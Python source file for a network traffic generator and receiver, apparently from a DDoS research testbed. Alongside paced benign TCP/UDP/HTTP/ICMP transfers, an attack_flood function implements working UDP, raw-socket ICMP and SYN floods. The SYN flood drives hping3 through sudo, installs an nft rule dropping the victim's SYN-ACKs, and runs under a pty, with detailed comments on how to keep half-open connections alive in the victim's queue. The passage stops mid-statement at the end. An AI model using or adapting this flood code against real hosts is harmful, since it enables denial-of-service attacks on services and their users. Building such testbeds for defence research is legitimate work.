"""Dependency-free worker and bounded TCP/UDP/HTTP receiver, Python >=3.8.

stdin: prepare JSON, then {start_unix: ...}; EOF or STOP cancels every task.
stdout: newline-delimited JSON. Keep stdout free of human diagnostics.
"""
from __future__ import annotations
import argparse
import asyncio
from asyncio import TimeoutError
import json
import math
import multiprocessing
import os
import pty
import shutil
import signal
import socket
import struct
import sys
import time
from urllib.parse import urlparse, parse_qs

try:
    from .connection_pool import ConnectionPool, close_writer
except ImportError:
    from connection_pool import ConnectionPool, close_writer

MAX_BYTES = 100_000_000_000


class AsyncTimeout:
    """Deadline context for Python 3.8+; preserve external cancellation."""
    def __init__(self, delay=None, deadline=None):
        self.delay,self.deadline=delay,deadline
        self.expired=False
    async def __aenter__(self):
        loop=asyncio.get_running_loop()
        self.task=asyncio.current_task()
        deadline=self.deadline if self.deadline is not None else loop.time()+self.delay
        def expire():
            self.expired=True
            self.task.cancel()
        self.handle=loop.call_at(deadline,expire)
        return self
    async def __aexit__(self, kind, value, traceback):
        self.handle.cancel()
        if kind is asyncio.CancelledError and self.expired:
            if hasattr(self.task,'uncancel'): self.task.uncancel()
            raise TimeoutError() from value
        return False


def emit(value):
    print(json.dumps(value, separators=(',', ':')), flush=True)


async def paced_send(writer, size, rate, packet, deadline, on_chunk=None):
    started, sent = time.monotonic(), 0
    while sent < size and time.monotonic() < deadline:
        wait = started + sent * 8 / max(rate, 1) - time.monotonic()
        if wait > 0:
            await asyncio.sleep(min(wait, max(0, deadline-time.monotonic())))
        if time.monotonic() >= deadline:
            break
        chunk = b'x' * min(packet, size-sent)
        writer.write(chunk)
        await writer.drain()
        sent += len(chunk)
        if on_chunk:
            on_chunk(len(chunk))
    return sent


async def receive_client(reader, writer):
    try:
        while True:
            line = await asyncio.wait_for(reader.readline(),30)
            if not line: return
            is_http = line.startswith((b'GET ', b'POST '))
            if is_http:
                method,target,_=line.decode().split()
                headers={}
                while True:
                    raw=await asyncio.wait_for(reader.readline(),3)
                    if raw in (b'\r\n',b'\n',b''):break
                    k,v=raw.decode().split(':',1);headers[k.lower()]=v.strip()
                query=parse_qs(urlparse(target).query)
                cfg=dict(direction='dl' if method=='GET' else 'ul',bytes=int(query.get('n',[headers.get('content-length',0)])[0]),rate_bps=float(query.get('rate',[1e6])[0]),duration_s=float(query.get('duration',[30])[0]),packet=1200)
                keep=headers.get('connection','').lower()=='keep-alive'
            else:
                cfg=json.loads(line)
                if cfg.get('op')=='capabilities':
                    writer.write(b'{"protocol_version":2,"persistent":true}\n');await writer.drain();return
                keep=bool(cfg.get('keepalive'))
            size,rate,duration=int(cfg['bytes']),float(cfg['rate_bps']),float(cfg['duration_s'])
            if not (0<=size<=MAX_BYTES and 0<rate<=1e11 and 0<duration<=3600):raise ValueError('Transfer limits exceeded')
            deadline=time.monotonic()+duration
            connection='keep-alive' if keep else 'close'
            async with AsyncTimeout(duration+2):
                if cfg['direction']=='dl':
                    if is_http:writer.write(('HTTP/1.1 200 OK\r\nContent-Length: %d\r\nConnection: %s\r\n\r\n' % (size,connection)).encode())
                    got=await paced_send(writer,size,rate,min(1400,max(28,int(cfg.get('packet',1200)))),deadline)
                else:
                    got=0
                    while got<size:
                        data=await reader.read(min(65536,size-got))
                        if not data:break
                        got+=len(data)
                    if is_http and (got==size or not keep):
                        writer.write(('HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nConnection: %s\r\n\r\n' % connection).encode())
                if keep and not is_http and got==size:writer.write(('BLACK %d\n' % got).encode())
                await writer.drain()
            if not keep or got!=size:return
    except (ValueError,KeyError,ConnectionError,TimeoutError,OSError):
        pass
    finally:
        await close_writer(writer)


class UDPReceiver(asyncio.DatagramProtocol):
    def connection_made(self, transport):
        self.transport = transport
    def datagram_received(self, data, addr):
        if data.startswith(b'BLDL:'):
            try:
                n = int(data[5:])
                if 1 <= n <= 1400:
                    self.transport.sendto(b'x'*n, addr)
            except ValueError:
                pass


async def receiver(host, tcp, udp, http, reuse_port=False):
    servers = [await asyncio.start_server(receive_client, host, port, reuse_port=reuse_port) for port in (tcp,http)]
    transport, _ = await asyncio.get_running_loop().create_datagram_endpoint(UDPReceiver, local_addr=(host,udp), reuse_port=reuse_port)
    print(f'Receiver ready: pid={os.getpid()} {host} TCP={tcp}, UDP={udp}, HTTP={http}', flush=True)
    try:
        await asyncio.Event().wait()
    finally:
        transport.close()
        for s in servers:
            s.close()
            await s.wait_closed()


def payload_budget(e, metrics, deadline):
    now=time.monotonic()
    available=max(0,deadline-now)
    packet=max(1,int(e['packet_size_bytes']))
    if e.get('direction')=='dl':packet=min(1400,max(28,packet))
    required=((max(0,e['planned_bytes']-1)//packet)*packet)*8/max(e['rate_bps'],1)
    metrics['nominal_payload_s']=e['planned_bytes']*8/max(e['rate_bps'],1)
    metrics.update(payload_start_monotonic=now,available_payload_s=available,
                   required_payload_s=required,setup_consumed_s=max(0,now-metrics.get('event_start_monotonic',now)),
                   budget_shortfall_s=max(0,required-available),budget_policy='strict_plan_window_v2')


def payload_outcome(e, metrics):
    if e['wire_protocol'] not in ('tcp','http','udp'):
        return 'not_applicable'
    actual=metrics.get('bytes_tx',0)+metrics.get('bytes_rx',0)
    return 'full_local' if actual>=e['planned_bytes'] else 'partial' if actual else 'zero'


ATTACK_PROTOCOLS = ('udp_flood', 'syn_flood', 'icmp_flood')


def _icmp_checksum(data):
    if len(data) % 2:
        data += b'\x00'
    total = sum((data[i] << 8) + data[i + 1] for i in range(0, len(data), 2))
    total = (total >> 16) + (total & 0xffff)
    total += total >> 16
    return (~total) & 0xffff


def _icmp_echo_packet(identifier, seq, size):
    """Raw ICMP echo request, type 8 code 0; no reply is awaited."""
    payload = b'x' * max(0, size - 8)
    header = struct.pack('!BBHHH', 8, 0, 0, identifier & 0xffff, seq & 0xffff)
    checksum = _icmp_checksum(header + payload)
    header = struct.pack('!BBHHH', 8, 0, checksum, identifier & 0xffff, seq & 0xffff)
    return header + payload


SYN_FLOOD_SPORT_BASE = 20000  # well under ip_local_port_range (32768-60999 on
# every node this has been checked against) so the nft rule below never
# matches this host's own OS-assigned ephemeral ports -- i.e. never touches
# concurrent BENIGN traffic from the same source to the same victim.
SYN_FLOOD_CLEANUP_LEAD_S = 1.0  # kill hping3 this long before the event's
# own deadline, to leave time for drain+nft-delete cleanup to finish before
# an external cancellation at deadline cuts it off mid-cleanup (confirmed
# live for ip-netns-wrapped sources -- fixed/mobile -- which are slower
# than a plain dedicated host to tear down; see this branch's own comment
# at the wait_for call).


async def attack_flood(e, target, metrics, deadline, context=None):
    """Fire-and-forget attack traffic generated by this client, no scapy.

    Unlike traffic(), there is no cooperating receiver: UDP packets are sent
    without the BLDL protocol, and ICMP echo requests are crafted on a raw
    socket without waiting for replies. Success is measured in packets
    sent/targeted rate, not delivered application bytes.

    syn_flood shells out to hping3 -- see that branch's own comment for why
    a pure-Python connect() can never produce a real half-open flood without
    IP spoofing, and what makes hping3's raw SYN actually occupy the
    victim's accept queue instead of self-aborting (docs/PROTECTED_RESOURCE.md
    §5 and §9, isp-ddos-ryu; confirmed live in all 3 domains that use this
    vector -- enterprise, fixed/broadband, mobile).
    """
    proto = e['wire_protocol']
    source = (context or {}).get('source_ip')
    pps = float(e.get('rate_pps') or 0)
    if pps <= 0:
        raise ValueError('Attack events require a positive rate_pps')
    packet = max(1, int(e.get('packet_size_bytes', 64)))
    loop = asyncio.get_running_loop()
    interval = 1 / pps
    start = time.monotonic()
    sent = 0

    def add(n):
        now = time.monotonic()
        metrics.setdefault('first_payload_monotonic', now)
        metrics['last_payload_monotonic'] = now
        metrics['packets_sent'] = metrics.get('packets_sent', 0) + 1
        metrics['bytes_tx'] += n

    async def pace():
        nonlocal sent
        target_t = start + sent * interval
        wait = target_t - time.monotonic()
        if wait > 0:
            await asyncio.sleep(min(wait, max(0, deadline - time.monotonic())))
        return time.monotonic() < deadline

    if proto == 'udp_flood':
        host, port = target['host'], target['udp_port']
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        if source:
            sock.bind((source, 0))
        sock.connect((host, port))  # fixes the destination; sock_sendall works pre-3.11
        payload = b'x' * packet
        try:
            while await pace():
                try:
                    await loop.sock_sendall(sock, payload)
                    add(packet)
                except OSError:
                    pass
                sent += 1
        finally:
            sock.close()
    elif proto == 'syn_flood':
        # A real half-open SYN flood without spoofing a source IP is harder
        # than it looks: a plain socket.connect() SYN is tracked by this
        # host's OWN kernel, which auto-completes the 3-way handshake (or,
        # if closed first, auto-sends an RST) the instant the victim's
        # SYN-ACK arrives -- regardless of what the Python code above does
        # or how long it waits. That RST reaches the victim almost as fast
        # as the original SYN, freeing its half-open accept-queue slot at
        # once -- confirmed live: the victim's own SyncookiesSent/
        # ListenDrops/TCPReqQFullDrop counters never moved across repeated
        # real attack runs under the previous connect()-then-close
        # implementation (docs/PROTECTED_RESOURCE.md §5, isp-ddos-ryu).
        #
        # hping3 --syn sends a raw SYN with no corresponding local socket
        # state, so by itself it has the SAME problem: this host's kernel,
        # on receiving a SYN-ACK for a port it never opened, auto-RSTs it.
        # The fix -- confirmed live to actually occupy the victim's queue,
        # in enterprise, fixed/broadband and mobile -- is a narrow nft rule
        # dropping that one inbound SYN-ACK before the kernel ever sees it,
        # scoped to the fixed source-port range reserved for hping3 below
        # (SYN_FLOOD_SPORT_BASE) so it can never match this same host's own
        # concurrent BENIGN traffic to the same victim (OS ephemeral ports).
        #
        # hping3 ALSO needs a controlling terminal to pace -i/-c correctly
        # -- confirmed live (docs/PROTECTED_RESOURCE.md §9, isp-ddos-ryu):
        # without one (plain pipes/DEVNULL, whether via asyncio's own
        # subprocess transport or a classic blocking subprocess.Popen in a
        # thread -- tried both), this hping3 build exits after a tiny
        # fraction of -c with a clean return code and self-contradictory
        # stats (far fewer "transmitted" than "received", negative packet
        # loss) -- some internal pacing/stats path depends on isatty()
        # that a plain pipe fails. A pty makes it behave exactly like an
        # interactive run (confirmed: the full expected duration, real
        # stats, including "DUP!" lines showing the victim's own SYN-ACK
        # retransmissions -- i.e. genuinely lingering half-opens).
        host, port = target['host'], target['tcp_port']
        remaining = max(0.0, deadline - time.monotonic())
        count = max(1, int(round(pps * remaining)))
        sport_base = SYN_FLOOD_SPORT_BASE
        table = f'syn_flood_{os.getpid()}'
        nft_script = (
            f'add table ip {table}\n'
            f'add chain ip {table} input {{ type filter hook input priority -1 ; }}\n'
            f'add rule ip {table} input ip saddr {host} '
            f'tcp dport {sport_base}-{sport_base + count - 1} tcp flags syn,ack drop\n'
        )
        setup = await asyncio.create_subprocess_exec(
            'sudo', '-n', 'nft', '-f', '-',
            stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.PIPE)
        _, setup_err = await setup.communicate(nft_script.encode())
        if setup.returncode != 0:
            raise RuntimeError('nft setup for syn_flood failed: ' + setup_err.decode(errors='replace'))
        try:
            metrics.setdefault('first_payload_monotonic', time.monotonic())
            hping_started = time.monotonic()
            master_fd, slave_fd = pty.openpty()
            tail = bytearray()

            async def drain():
                # Nothing reads hping3's pty output otherwise, which would
                # eventually block its writes (and so its own pacing) once
                # the kernel's pty buffer fills -- keep it drained, and keep
                # a bounded tail for the fast-failure error message below.
                while True:
                    try:
                        chunk = await loop.run_in_executor(None, os.read, master_fd, 4096)
                    except OSError:
                        return
                    if not chunk:
                        return
                    tail.extend(chunk)
                    del tail[:-2000]

            drain_task = asyncio.ensure_future(drain())
            try:
                # Deliberately no -c: this host's own concurrent BENIGN
                # traffic to the same victim:port (same B0+attack run) is
                # indistinguishable, to this old hping3 build's loose
                # receive-matching, from a reply to ITS OWN probe -- with
                # -c set, that ambient traffic alone reaches the target
                # count almost instantly, ending the flood after a tiny
                # fraction of its real duration (confirmed live: 2074
                # "received" within ~1s of a 60s flood, while this host's
                # own transmitted count stayed in the dozens -- docs/
                # PROTECTED_RESOURCE.md §9, isp-ddos-ryu). Without -c,
                # hping3 just keeps sending at -i's rate regardless of what
                # it (mis)counts as received, until this coroutine's own
                # timeout below kills it -- the actual duration control.
                hping = await asyncio.create_subprocess_exec(
                    'sudo', '-n', 'hping3', '--syn', '-p', str(port), '-s', str(sport_base),
                    '-i', 'u' + str(max(1, int(round(1_000_000 / pps)))), host,
                    stdin=slave_fd, stdout=slave_fd, stderr=slave_fd)
            finally:
                os.close(slave_fd)
            try:
                # Bounded by `deadline` itself (not `remaining` from before
                # the nft/pty setup above -- some real time already passed),
                # and with a LEAD of SYN_FLOOD_CLEANUP_LEAD_S rather than
                # zero margin: this coroutine's own task gets cancelled from
                # outside AT deadline (confirmed live -- waiting right up to
                # deadline left no room for the kill+drain+nft-delete
                # cleanup below, which lost that race for the slower,
                # ip-netns-wrapped domains -- fixed/mobile -- often enough
                # to skip the metrics tail past this whole if/elif entirely,
                # docs/PROTECTED_RESOURCE.md §9), so this has to kill hping3
                # (and finish cleaning up) comfortably before that happens.
                await asyncio.wait_for(hping.wait(), timeout=max(0.0, deadline - SYN_FLOOD_CLEANUP_LEAD_S - time.monotonic()))
            except asyncio.TimeoutError:
                # The expected path for a full-rate, full-duration flood:
                # hping3 keeps running (it has no native "stop after N
                # seconds" flag independent of -c) until this same timeout
                # that mirrors the event's own deadline kills it -- not a
                # failure.
                hping.kill()
                await hping.wait()
            drain_task.cancel()
            try:
                await drain_task
            except asyncio.CancelledError:
                pass
            os.close(master_fd)
            # A startup-time failure (bad sudo rule, missing binary, ...)
            # exits almost immediately; a flood that actually ran for
            # (most of) its own duration did its job regardless of exit
            # code (SIGKILL above, or hping3's own non-zero exit on partial
            # packet loss, both expected). Only the fast-failure case is a
            # real error -- raised, not swallowed, so the normal exception
            # handling further up this call's own stack sets metrics['error'].
            if hping.returncode not in (0, None) and time.monotonic() - hping_started < remaining / 2:
                raise RuntimeError('hping3 failed: ' + bytes(tail).decode(errors='replace').strip()[-300:])
            metrics['last_payload_monotonic'] = time.monotonic()
            metrics['packets_sent'] = metrics.get('packets_sent', 0) + count
            metrics['bytes_tx'] += count * packet
            sent += count
        finally:
            cleanup = await asyncio.create_subprocess_exec(
                'sudo', '-n', 'nft', 'delete', 'table', 'ip', table,
                stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
            await cleanup.wait()
    elif proto == 'icmp_flood':
        host = target['host']
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError as exc:
            raise PermissionError('icmp_flood requires CAP_NET_RAW/root on the client') from exc
        sock.setblocking(False)
        if source:
            sock.bind((source, 0))
        sock.connect((host, 0))  # fixes the destination; sock_sendall works pre-3.11
        identifier = os.getpid() & 0xffff
        try:
            while await pace():
                sent += 1
                try:
                    await loop.sock_sendall(sock, _icmp_echo_packet(identifier, sent, packet))
                    add(packet)
                except OSError:
                    pass
        finally:
            sock.close()
    else:
        raise ValueError(f'Unknown attack protocol: {proto}')
    elapsed = max(.001, time.monotonic() - start)
    metrics['attack_pps_target'] = pps
    metrics['attack_pps_actual'] = sent / elapsed
    metrics['attack_packets_total'] = sent


async def traffic(e, target, metrics, deadline, context=None, pool=None):
    context=context or {}
    source=context.get('source_ip')
    interface=context.get('interface')
    metrics['source_ip']=source
    metrics['source_interface']=interface
    if e['wire_protocol'] in ATTACK_PROTOCOLS:
        return await attack_flood(e, target, metrics, deadline, context)
    size, rate, packet = e['planned_bytes'], e['rate_bps'], e['packet_size_bytes']
    proto, direction = e['wire_protocol'], e['direction']
    def add(kind, n):
        now=time.monotonic()
        metrics.setdefault('first_payload_monotonic',now)
        metrics['last_payload_monotonic']=now
        metrics[f'bytes_{kind}'] += n
        metrics[f'chunks_{kind}'] += 1
    if pool is not None and proto in ('tcp','http'):
        return await pooled_traffic(e,target,metrics,deadline,context,pool)
    if proto in ('tcp','http'):
        port = target['http_port' if proto == 'http' else 'tcp_port']
        metrics['connect_start_monotonic']=time.monotonic()
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target['host'], port,local_addr=(source,0) if source else None), 3)
        metrics['connect_end_monotonic']=time.monotonic()
        metrics['connect_s']=metrics['connect_end_monotonic']-metrics['connect_start_monotonic']
        metrics['source_ip'],metrics['src_port'] = writer.get_extra_info('sockname')[:2]
        metrics['dst_port'] = port
        metrics['connections_opened']=1
        metrics['connection_reused']=False
        try:
            remaining = max(.001, deadline-time.monotonic())
            if proto == 'http':
                path = f'/bytes?n={size}&rate={rate}&duration={remaining}'
                request = f'{"GET" if direction == "dl" else "POST"} {path} HTTP/1.1\r\nHost: {target["host"]}\r\nContent-Length: {0 if direction == "dl" else size}\r\nConnection: close\r\n\r\n'
                writer.write(request.encode())
            else:
                writer.write((json.dumps(dict(direction=direction, bytes=size, rate_bps=rate, duration_s=remaining, packet=packet))+'\n').encode())
            await writer.drain()
            metrics['request_sent_monotonic']=time.monotonic()
            payload_budget(e,metrics,deadline)
            if direction == 'ul':
                await paced_send(writer, size, rate, packet, deadline, lambda n:add('tx',n))
            else:
                if proto == 'http':
                    status = await reader.readline()
                    if b' 200 ' not in status:
                        raise ValueError('HTTP receiver returned non-200')
                    while await reader.readline() not in (b'\r\n', b'\n', b''):
                        pass
                while metrics['bytes_rx'] < size:
                    data = await reader.read(min(65536,size-metrics['bytes_rx']))
                    if not data: break
                    add('rx',len(data))
                if metrics['bytes_rx']>=size:metrics.update(receiver_bytes=size,receiver_confirmation='client_received')
                if metrics['bytes_rx'] < size and time.monotonic() < deadline-.1:
                    raise ConnectionError('Receiver closed before completing payload')
        finally:
            writer.close()
            try: await writer.wait_closed()
            except OSError: pass
    elif proto == 'udp':
        loop = asyncio.get_running_loop()
        infos = await loop.getaddrinfo(target['host'], target['udp_port'], family=socket.AF_INET, type=socket.SOCK_DGRAM)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        if source: sock.bind((source,0))
        sock.connect(infos[0][4])
        metrics['source_ip'],metrics['src_port'] = sock.getsockname()[:2]
        metrics['dst_port'] = target['udp_port']
        start, sent = time.monotonic(), 0
        try:
            while sent < size and time.monotonic() < deadline:
                wait = start + sent*8/max(rate,1)-time.monotonic()
                if wait > 0: await asyncio.sleep(min(wait,max(0,deadline-time.monotonic())))
                if time.monotonic() >= deadline: break
                n = min(packet,size-sent)
                if direction == 'ul':
                    await loop.sock_sendall(sock,b'x'*n)
                    add('tx',n)
                else:
                    await loop.sock_sendall(sock,f'BLDL:{n}'.encode())
                    data = await asyncio.wait_for(loop.sock_recv(sock,1400),min(1,max(.001,deadline-time.monotonic())))
                    add('rx',len(data))
                sent += n
        finally:
            sock.close()
    elif proto == 'icmp':
        # Ping observations are kept separate from TCP application chunk counts.
        interval = max(.02, packet*8/max(rate,1))
        count = max(1, math.ceil(size/packet))
        args = ['ping','-n','-c',str(count),'-i',str(interval),'-s',str(packet),target['host']]
        if source: args[1:1]=['-I',source]
        proc = await asyncio.create_subprocess_exec(*args,stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE)
        try:
            while True:
                line = await proc.stdout.readline()
                if not line: break
                if b'bytes from' in line:
                    add('rx',packet)
                    metrics['icmp_replies'] += 1
            await proc.wait()
            if proc.returncode:
                raise RuntimeError((await proc.stderr.read()).decode()[:500] or 'ping failed')
        finally:
            if proc.returncode is None:
                proc.terminate()
                try: await asyncio.wait_for(proc.wait(),1)
                except TimeoutError:
                    proc.kill()
                    await proc.wait()


async def http_response(reader,expected,size):
    status=await reader.readline()
    if (' %d ' % expected).encode() not in status:raise ValueError('Unexpected HTTP response')
    headers={}
    while True:
        line=await reader.readline()
        if not line:raise ConnectionError('Incomplete HTTP headers')
        if line in (b'\r\n',b'\n'):break
        k,v=line.decode().split(':',1);headers[k.lower()]=v.strip()
    if int(headers.get('content-length',-1))!=size:raise ValueError('HTTP response length differs from event quota')
    return headers.get('connection','').lower()=='keep-alive'


async def pooled_traffic(e,target,metrics,deadline,context,pool):
    key=pool.key(e,target,context.get('source_ip'))
    metrics['connect_start_monotonic']=time.monotonic()
    reader,writer,reused=await pool.acquire(key)
    metrics['connect_end_monotonic']=time.monotonic()
    metrics['connect_s']=metrics['connect_end_monotonic']-metrics['connect_start_monotonic']
    metrics['source_ip'],metrics['src_port']=writer.get_extra_info('sockname')[:2]
    metrics['dst_port']=key[4];metrics['connections_opened']=0 if reused else 1;metrics['connection_reused']=reused
    size,rate,packet=e['planned_bytes'],e['rate_bps'],e['packet_size_bytes']
    http=e['wire_protocol']=='http';direction=e['direction'];reusable=False
    def add(kind,n):
        now=time.monotonic();metrics.setdefault('first_payload_monotonic',now);metrics['last_payload_monotonic']=now
        metrics['bytes_'+kind]+=n;metrics['chunks_'+kind]+=1
    try:
        remaining=max(.001,deadline-time.monotonic())
        if http:
            request='%s /bytes?n=%d&rate=%s&duration=%s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nConnection: keep-alive\r\n\r\n' % ('GET' if direction=='dl' else 'POST',size,rate,remaining,target['host'],0 if direction=='dl' else size)
            writer.write(request.encode())
        else:writer.write((json.dumps(dict(direction=direction,bytes=size,rate_bps=rate,duration_s=remaining,packet=packet,keepalive=True))+'\n').encode())
        await writer.drain()
        metrics['request_sent_monotonic']=time.monotonic()
        payload_budget(e,metrics,deadline)
        keep=True
        if direction=='ul':
            sent=await paced_send(writer,size,rate,packet,deadline,lambda n:add('tx',n))
            if sent!=size:return
            if http:keep=await http_response(reader,204,0);metrics['receiver_bytes']=size
        else:
            if http:keep=await http_response(reader,200,size)
            while metrics['bytes_rx']<size:
                data=await reader.read(min(65536,size-metrics['bytes_rx']))
                if not data:
                    if time.monotonic()<deadline-.1:raise ConnectionError('Receiver closed before completing payload')
                    return  # Preserve legacy near-deadline shortfall classification; discard socket.
                add('rx',len(data))
            if http:metrics['receiver_bytes']=size
        if not http:
            ack=await reader.readline()
            if ack!=('BLACK %d\n' % size).encode():raise ConnectionError('Persistent transfer acknowledgement missing')
            metrics['receiver_bytes']=size
        metrics['receiver_confirmation']='receiver_acknowledged' if direction=='ul' else 'client_received'
        metrics['ack_monotonic']=time.monotonic()
        reusable=keep
    finally:
        if reusable:await pool.release(key,reader,writer)
        else:await pool.discard(writer)


async def ip_json(*args):
    proc=await asyncio.create_subprocess_exec('ip','-j',*args,stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE)
    try:
        out,err=await asyncio.wait_for(proc.communicate(),5)
    except BaseException:
        if proc.returncode is None:
            proc.kill()
            await proc.wait()
        raise
    if proc.returncode: raise ValueError(err.decode(errors='replace')[:1000])
    return json.loads(out)


async def inspect_context(context, targets, events):
    if not context.get('check_route'): return {'route_checked':False}
    interface=context.get('interface')
    source=context.get('source_ip')
    if not interface or not source: raise ValueError('Route preflight requires interface and source_ip')
    addresses=await ip_json('address','show','dev',interface)
    if not any(a.get('local')==source for link in addresses for a in link.get('addr_info',[])):
        raise ValueError(f'Source IP {source} not assigned to {interface} in execution context')
    routes=[]
    for destination in sorted({e['destination'] for e in events}):
        # Do not force oif here: verify the route the bound socket will actually choose.
        rows=await ip_json('route','get',targets[destination]['host'],'from',source)
        if not rows or rows[0].get('dev')!=interface:
            raise ValueError(f'Unexpected data-plane interface for {destination}: {rows}')
        route=rows[0]
        if context.get('expected_gateway') and route.get('gateway')!=context['expected_gateway']:
            raise ValueError(f'Unexpected gateway for {destination}: {route}')
        routes.append(dict(destination=destination,**route))
    return dict(route_checked=True,source_ip=source,interface=interface,routes=routes,
                session_id=context.get('session_id'),session_validation='operator_mapping_only',
                interfaces=addresses)


async def worker():
    loop = asyncio.get_running_loop()
    reader = asyncio.StreamReader(limit=32*1024*1024)
    protocol = asyncio.StreamReaderProtocol(reader)
    await loop.connect_read_pipe(lambda:protocol, sys.stdin)
    cfg = json.loads(await reader.readline())
    stop = asyncio.Event()
    for sig in (signal.SIGTERM, signal.SIGINT):
        loop.add_signal_handler(sig, stop.set)
    if any(e['wire_protocol']=='icmp' for e in cfg['events']) and not shutil.which('ping'):
        emit(dict(type='fatal',error='ping not found'))
        return
    context=cfg.get('context',{})
    options=cfg.get('execution',{})
    pool=ConnectionPool(options) if options.get('connection_reuse') else None
    evidence={}
    # Connectivity checks happen before the shared start time is selected.
    endpoints = {(cfg['targets'][e['destination']]['host'], cfg['targets'][e['destination']]['http_port' if e['wire_protocol']=='http' else 'tcp_port'])
                 for e in cfg['events'] if e['wire_protocol'] in ('tcp','http')}
    try:
        evidence=await inspect_context(context,cfg['targets'],cfg['events'])
        for host,port in endpoints:
            for attempt in range(3):
                try:
                    preflight_reader, w = await asyncio.wait_for(asyncio.open_connection(host,port,local_addr=(context['source_ip'],0) if context.get('source_ip') else None),3)
                    try:
                        if pool is not None:
                            w.write(b'{"op":"capabilities"}\n');await w.drain()
                            capabilities=json.loads(await asyncio.wait_for(preflight_reader.readline(),3))
                            if capabilities.get('protocol_version')!=2 or not capabilities.get('persistent'):raise ValueError('Receiver lacks persistent protocol v2')
                    finally:
                        await close_writer(w)
                    break
                except (OSError, TimeoutError) as exc:
                    if attempt==2:
                        raise ValueError('Cannot connect to %s:%s from %s: %s %s' % (host,port,context.get('source_ip'),type(exc).__name__,exc)) from exc
                    await asyncio.sleep(.2)
    except (OSError, TimeoutError, ValueError) as exc:
        if pool:await pool.close()
        emit(dict(type='fatal',error=f'Receiver preflight: {exc}'))
        return
    if pool is not None:
        keys=[]
        for e in cfg['events']:
            if e['wire_protocol'] not in ('tcp','http'):continue
            key=pool.key(e,cfg['targets'][e['destination']],context.get('source_ip'))
            if key not in keys:keys.append(key)
            if len(keys)>=options.get('preconnect_limit',8):break
        async def warm(key):
            reader,writer,_=await pool.acquire(key)
            await pool.release(key,reader,writer)
        try:
            results=await asyncio.gather(*(warm(key) for key in keys),return_exceptions=True)
            failures=[result for result in results if isinstance(result,Exception)]
            if failures:raise failures[0]
        except Exception as exc:
            await pool.close();emit(dict(type='fatal',error='Connection preparation: '+str(exc)));return
    emit(dict(type='ready',unix=time.time(),evidence=evidence,protocol_version=2,pid=os.getpid(),python_version=sys.version.split()[0],capabilities=['metrics_batch','persistent']))
    while True:
        raw = await reader.readline()
        received = time.time()
        if not raw or raw.strip()==b'STOP':
            if pool:await pool.close()
            return
        message = json.loads(raw)
        if message.get('type') == 'clock':
            emit(dict(type='clock',nonce=message['nonce'],received_unix=received,sent_unix=time.time()))
            continue
        if 'start_unix' not in message:
            if pool:await pool.close()
            return
        start = message['start_unix']
        break
    origin = loop.time() + start-time.time()
    active = {}
    async def control():
        await reader.readline()
        stop.set()
    async def reporter():
        while True:
            await asyncio.sleep(options.get('metrics_interval_s',1))
            items=[dict(event_id=eid,**metrics) for eid,metrics in list(active.items())]
            if options.get('metrics_batch'):
                if items:emit(dict(type='metrics_batch',timestamp=time.time(),items=items))
            else:
                for item in items:emit(dict(type='metrics',**item))
            if pool:emit(dict(type='worker_stats',connections=pool.stats()))
    async def event(e):
        metrics = dict(bytes_tx=0,bytes_rx=0,chunks_tx=0,chunks_rx=0,icmp_replies=0,src_port=None,dst_port=None)
        metrics.update(event_start_monotonic=time.monotonic(),receiver_confirmation='unverified')
        started = False
        status, error = 'completed', None
        try:
            await asyncio.sleep(max(0,origin+e['start_s']-loop.time()))
            started = True
            metrics['event_start_monotonic']=time.monotonic()
            elapsed = loop.time()-origin
            active[e['event_id']] = metrics
            emit(dict(type='event',event_id=e['event_id'],status='running',actual_start_s=elapsed,start_timestamp=time.time(),lateness_s=elapsed-e['start_s']))
            end = origin+e['start_s']+e['duration_s']
            if end <= loop.time():
                status, error = 'failed', 'Missed event deadline'
            else:
                try:
                    async with AsyncTimeout(deadline=end+.05):
                        await traffic(e,cfg['targets'][e['destination']],metrics,end,context,pool)
                except TimeoutError:
                    status = 'completed' if payload_outcome(e,metrics)=='full_local' else 'failed'
                    error = 'Deadline reached; compare actual and planned bytes'
        except asyncio.CancelledError:
            status, error = 'cancelled', 'Run stopped'
        except Exception as exc:
            status, error = 'failed', str(exc)[:1000]
        finally:
            active.pop(e['event_id'], None)
            actual=metrics['bytes_tx']+metrics['bytes_rx']
            metrics['shortfall_bytes']=max(0,e['planned_bytes']-actual) if started and e['wire_protocol'] in ('tcp','http','udp') else 0
            if status=='completed' and metrics['shortfall_bytes']:
                status='failed'
                error=error or 'Scheduled payload shortfall: %s of %s bytes' % (actual,e['planned_bytes'])
            metrics['payload_state']=payload_outcome(e,metrics)
            for phase in ('connect_start','connect_end','request_sent','payload_start','first_payload','last_payload','ack'):
                value=metrics.pop(phase+'_monotonic',None)
                if value is not None:metrics[phase+'_s']=value-metrics['event_start_monotonic']
            metrics.pop('event_start_monotonic',None)
            emit(dict(type='event',event_id=e['event_id'],status=status,actual_end_s=loop.time()-origin if started else None,
                      stop_timestamp=time.time(),error=error,**metrics))
    tasks = [asyncio.create_task(event(e)) for e in cfg['events']]
    all_done = asyncio.gather(*tasks)
    stopper = asyncio.create_task(stop.wait())
    ctl, rpt = asyncio.create_task(control()), asyncio.create_task(reporter())
    try:
        done,_ = await asyncio.wait([all_done,stopper],timeout=max(0,start-time.time())+cfg['duration_s']+5,return_when=asyncio.FIRST_COMPLETED)
        if all_done not in done:
            for task in tasks: task.cancel()
        await all_done
    finally:
        for task in (stopper,ctl,rpt): task.cancel()
        await asyncio.gather(stopper,ctl,rpt,return_exceptions=True)
    if pool:
        await pool.close()
        emit(dict(type='worker_stats',connections=pool.stats()))
    emit(dict(type='done'))


def receiver_process(host, tcp, udp, http):
    asyncio.run(receiver(host, tcp, udp, http, reuse_port=True))


def parallel_receiver(args):
    """Supervise independent event loops sharing Linux SO_REUSEPORT sockets."""
    ctx = multiprocessing.get_context('spawn')
    children = [ctx.Process(target=receiver_process,
